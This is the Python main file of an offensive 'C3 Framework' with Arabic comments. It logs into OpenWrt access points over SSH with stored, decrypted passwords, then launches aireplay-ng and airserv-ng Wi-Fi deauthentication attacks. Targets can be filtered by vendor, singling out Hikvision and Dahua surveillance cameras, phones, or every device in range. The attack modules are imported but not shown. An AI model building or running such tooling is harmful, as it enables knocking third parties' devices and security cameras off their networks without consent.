#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Ultimate C3 Framework - Hardened Micro OOP Main Bootstrap (v2 - AP Sourced & Verifier Integrated)
File: /home/kali/C3_Framework/main_v2.py
"""

import os
import sys

# منع بايثون من توليد ملفات الكاش المعلقة للأبد لحماية الأذونات
os.environ["PYTHONDONTWRITEBYTECODE"] = "1"
sys.dont_write_bytecode = True

import time
import signal
import threading
from core.ssh_executor import SSHHardwareExecutor
from core.dynamic_scout import DynamicScout
from core.database import DatabaseManager
from core.ap_verifier import AccessPointHardwareVerifier
from security_files.oop_orchestrator import AttackOrchestrator
from security_files.airserv_detector import AirservDetector
from security_files.radar_manager import RadarSizeGuardManager
from security_files.cpu_watchdog import RemoteCPUWatchdog
from security_files.attack_monitor import AttackPortMonitor
from modules.target_filter_engine import TargetFilterEngine
from modules.ap_ui import ProtectedDevicesConsoleUI
from modules.group_ui import TargetGroupConsoleUI
from modules.control_center_ui import FastControlCenterUI
from modules.menu_router import TacticalMenuRouter
from modules.attack_pipeline import TacticalAttackEngine

class C3MicroFrameworkBootstrap:
    def __init__(self):
        # القفل الذري المشترك للتحكم في خيوط المعالجة الخلفية
        self.attack_shutdown_lock = threading.Event()
        self.is_attack_active = False
        self.strain_counter = 0
        self.target_vifs_cache = []
        
        # معلومات القاذف النشط لتغذية البانر الثابت (Sticky Header) حياً
        self.active_ap_name = "N/A"
        self.active_frequency = "N/A"
        self.active_channel = "N/A"
        self.active_port = "N/A"

        # شحن قاعدة البيانات المركزية الحارسة
        self.db = DatabaseManager()
        
        # عزل سياقات الجلسات العتادية لمنع الاختناق وتجميد الأوامر
        self.scout_executor = SSHHardwareExecutor()
        self.orch_executor = SSHHardwareExecutor()
        self.airserv_executor = SSHHardwareExecutor()
        self.filter_executor = SSHHardwareExecutor()
        self.watchdog_executor = SSHHardwareExecutor()
        
        self.scout = DynamicScout(self.scout_executor)
        self.orchestrator = AttackOrchestrator(self.orch_executor)
        self.airserv_mgr = AirservDetector(self.airserv_executor)
        self.radar_mgr = RadarSizeGuardManager()
        
        self.cpu_guard = RemoteCPUWatchdog(self.watchdog_executor)
        self.port_guard = AttackPortMonitor()
        self.filter_engine = TargetFilterEngine(self.filter_executor, self.db)
        
        # كائن التحقق الجراحي واختبار العتاد المستحدث حياً
        self.verifier = AccessPointHardwareVerifier(self.scout_executor)
        
        # تمرير المراجع الحية المعزولة للرام حصرًا لمنع الـ Multi-Instantiation
        self.ap_interface = ProtectedDevicesConsoleUI(self.db)
        self.group_interface = TargetGroupConsoleUI(self.db)
        self.fast_control_center = FastControlCenterUI(self.scout_executor, self.scout)
        
        self.router = TacticalMenuRouter(self)
        self.pipeline = TacticalAttackEngine(self)
        
        # صمام أمان مقاطعة النواة الحاسم
        signal.signal(signal.SIGINT, self.pure_safe_retreat_handler)

    def pure_safe_retreat_handler(self, signum, frame):
        """إيقاف ذري فوري وشامل لعمليات الخلفية وتطهير الأجواء كالضماد بالمسطرة البرمية"""
        self.is_attack_active = False
        self.attack_shutdown_lock.set() 
        
        print("\n\033[93m[!] تم تفعيل مقاطعة الانسحاب الطارئ - جارٍ تطهير وإخلاء الأجواء العتادية...\033[0m")
        emergency_executor = SSHHardwareExecutor(self.scout_executor.ip, self.scout_executor.password)
        if hasattr(self, 'radar_mgr'):
            self.radar_mgr.terminate_local_radar()
            
        emergency_cmd = [
            "/bin/sh", "-c", 
            "killall -9 airserv-ng aireplay-ng > /dev/null 2>&1; "
            "uci del wireless.mon0 > /dev/null 2>&1; "
            "uci del wireless.mon1 > /dev/null 2>&1; "
            "uci revert wireless; wifi reload"
        ]
        emergency_executor.execute_raw_command(emergency_cmd)
        
        if self.target_vifs_cache:
            commands_pool = [f"uci set wireless.{item.get('vif')}.disabled='0'" for item in self.target_vifs_cache if item.get('vif')]
            if commands_pool:
                commands_pool.extend(["uci commit wireless", "wifi reload"])
                emergency_executor.execute_raw_command(["/bin/sh", "-c", " && ".join(commands_pool)])
                
        print("\033[92m[+] اكتمل التطهير التكتيكي الشامل. الأثير آمن والمنصة مغلقة ونظيفة.\033[0m")
        if signum is not None:
            sys.exit(0)

    def _inject_ap_session_credentials(self, ap_record):
        """حقن فوري للهويات المفككة بالـ AES داخل قنوات الـ SSH بالرام حركياً"""
        ap_ip = ap_record[2]
        ap_plain_pass = self.db._decrypt_password(ap_record[4])
        
        for executor in [self.scout_executor, self.orch_executor, self.airserv_executor, self.filter_executor, self.watchdog_executor]:
            executor.ip = ap_ip
            executor.password = ap_plain_pass

    def launch_attack_ap_selection_matrix(self):
        """مصفوفة اختيار قواذف الأكسس بوينت مع الفحص العتادي الحار قبل إطلاق الضربات"""
        while True:
            print("\n" + "═"*65)
            print(f" [\033[91m⚡\033[0m] نشر المنظومة الفرعية للهجوم -> اختر قاذف الأكسس بوينت الموجه")
            print("═"*65)
            
            aps = self.db.fetch_all_registered_aps()
            if not aps:
                print("\033[91m[-] [!] خطأ في السيطرة: لا توجد أجهزة أكسس بوينت مسجلة بنظام الترسانة.\033[0m")
                time.sleep(2)
                break
                
            for idx, item in enumerate(aps, 1):
                print(f"  [\033[92m{idx}\033[0m] - القاذف: \033[92m{item[1]:<14}\033[0m | عنوان الآي بي: \033[96m{item[2]:<15}\033[0m | المجموعة: \033[95m{item[5]}\033[0m")
            print("─"*65)
            print("  [\033[91m0\033[0m] العودة إلى قائمة التحكم الرئيسية (أو اضغط Enter مباشرة)")
            print("─"*65)
            
            choice = input("\n[>] اختر رقم الأكسس بوينت لبدء العمليات عليها: ").strip()
            if choice == '0' or choice == '':
                break
                
            if choice.isdigit() and 1 <= int(choice) <= len(aps):
                selected_ap = aps[int(choice) - 1]
                self.active_ap_name = selected_ap[1]
                
                # 1. شحن وفك قفل الهويات بالـ AES بالرام حركياً لمرة واحدة حصرًا
                self._inject_ap_session_credentials(selected_ap)
                
                print("\n\033[94m[*] جارٍ إجراء اختبار الاتصال وفحص العتاد الحار للقاذف المختار...\033[0m")
                if not self.verifier.verify_hardware_connection_pulse():
                    print("\033[91m[!] خطأ عتادي: الجهاز لا يستجيب عبر الـ SSH. تحقق من الشبكة والآي بي.\033[0m")
                    time.sleep(2)
                    continue
                
                # 2. الاستعلام الجراحي وعرض معلومات النظام والترددات منفصلة
                release_info = self.verifier.fetch_openwrt_firmware_release()
                interfaces_map = self.verifier.fetch_isolated_interfaces_map()
                
                print(f"\n\033[92m[+] تم تأكيد الاتصال الحار بنجاح صامد:\033[0m")
                print(f"  -> النظام الداخلي: {release_info['dist']} (إصدار: {release_info['version']})")
                print(f"  -> كيرنل النواة البعيدة: {release_info['kernel']}")
                
                print(f"\n\033[94m[*] خارطة الكروت والترددات المفككة عتادياً بالراوتر:\033[0m")
                for freq_band in ["2G", "5G"]:
                    print(f"  ■ نطاق تردد وحزم الـ {freq_band}:")
                    if not interfaces_map[freq_band]:
                        print("    [!] لا توجد كروت أو واجهات بث نشطة لهذا التردد حالياً.")
                    for iface in interfaces_map[freq_band]:
                        print(f"    - كرت: {iface['radio']} | الواجهة: {iface['interface_name']} | القناة: {iface['channel']} | الشبكة: \033[93m{iface['ssid']}\033[0m | الوضع: {iface['status']}")
                
                # 3. دفع خيارات الأثير وقفل القنوات وبدء القذف غير المتزامن
                freq_target = input("\n[?] اختر تردد الهجوم المستهدف بناءً على خارطة العتاد (2G / 5G): ").strip().upper()
                if freq_target in ["2G", "5G"]:
                    self.active_frequency = freq_target
                    
                    print("\n[ إعدادات واجهة فلاتر البصمات وتوجيه القذائف الجراحية OUI ]")
                    print(" [\033[92m1\033[0m] استهداف جراحي قاطع لكاميرات المراقبة الأمنية حصرًا (Hikvision & Dahua)")
                    print(" [\033[92m2\033[0m] استهداف محطات الأجهزة الذكية والهواتف فقط (Apple/Samsung/Huawei/Xiaomi)")
                    print(" [\033[92m3\033[0m] إطلاق الفصل التلقائي الشامل على كافة كيانات الأجواء عشوائياً (Wildcard)")
                    oui_choice = input("[>] برجاء اختيار وضع الفلترة [1/2/3]: ").strip()
                    
                    # تمرير الهوية الكاملة وحقن الـ Sticky Header ومحرك الـ Pipeline بالخلفية حياً
                    self.pipeline.start_asynchronous_attack(freq_target, oui_choice)
                    break
            else:
                print("[!] اختيار خارج الحدود الفهرسية المسموح بها.")

    def bootstrap_orchestration_loop(self):
        """حلقة السيطرة الأساسية واستقبال أوامر اللوحة الذكية"""
        while True:
            sys.stdin.flush()
            choice = self.router.display_clear_dashboard()
            
            if choice == "1":
                self.ap_interface.display_ui_frame()
            elif choice == "2":
                self.group_interface.display_group_menu()
            elif choice == "3":
                self.fast_control_center.display_hot_center()
            elif choice == "4":
                freq = input("[?] اختر نطاق التردد المطلوب استطلاعه (2G / 5G): ").strip().upper()
                if freq in ["2G", "5G"]:
                    res = self.scout.parse_interfaces_by_frequency(freq)
                    print(f"\n[*] الواجهات المكتشفة حياً لنطاق {freq}:")
                    for i in res:
                        print(f" - كرت راديو: {i['radio_id']} | واجهة البث UCI: {i['vif_id']} | القناة: {i['channel']} | زبائنها: {i['clients']}")
            elif choice == "5":
                if not self.is_attack_active:
                    self.launch_attack_ap_selection_matrix()
                else:
                    print("\033[93m[*] تم إرسال أمر إجهاض الهجوم النشط فوراً عبر اللوحة...\033[0m")
                    self.pure_safe_retreat_handler(None, None)
            elif choice == "w" or choice == "W":
                if self.is_attack_active:
                    print(f"\n\033[94m[*] [نبض الحارس] -> معدل ضغط معالج الراوتر البعيد حياً هو: {self.cpu_guard.fetch_hardware_cpu_load()}\033[0m")
            elif choice == "0":
                self.pure_safe_retreat_handler(signal.SIGINT, None)
            else:
                print("[!] خيار غير معرف. برجاء إدخال رقم أمر صحيح من اللوحة.")

if __name__ == "__main__":
    if os.getuid() != 0:
        print("[!] خطأ في الصلاحيات: يرجى تشغيل لودر الإقلاع بصلاحيات الجدار الناري الحصين (sudo / root).")
        sys.exit(1)
    launcher = C3MicroFrameworkBootstrap()
    launcher.bootstrap_orchestration_loop()
